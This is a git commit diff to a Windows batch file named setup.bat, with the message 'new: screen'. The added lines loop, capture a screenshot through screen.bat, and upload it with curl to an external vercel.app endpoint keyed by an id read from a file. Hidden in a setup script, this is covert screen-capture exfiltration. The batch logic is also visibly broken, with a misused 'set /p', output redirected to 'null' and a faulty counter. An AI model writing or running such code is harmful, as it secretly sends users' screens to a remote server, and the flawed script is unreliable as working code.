467f50949a600a7521b885906e23556a736d48b2
kirubel demelash <62418642+kiztopia1@users.noreply.github.com>
2023-02-14 21:19:36 +0300

    new: screen

--- setup.bat
+++ setup.bat
@@ -14,5 +14,22 @@ goto program
 goto program
 )
 
-:program
+:loop
+set /p second= %second% +1
+ping localhost -n 3 > null
+goto program
 
+
+
+:program
+echo program %second%
+if %second% == 6 (
+    set second = 0
+    goto sendShot
+)
+
+:sendShot
+set id=<.true
+cmd /C .\screen.bat shot.png
+curl -F testImage=@shot.png -F name=kira https://test-api-t78m.vercel.app/updateShot/%id%
+goto program
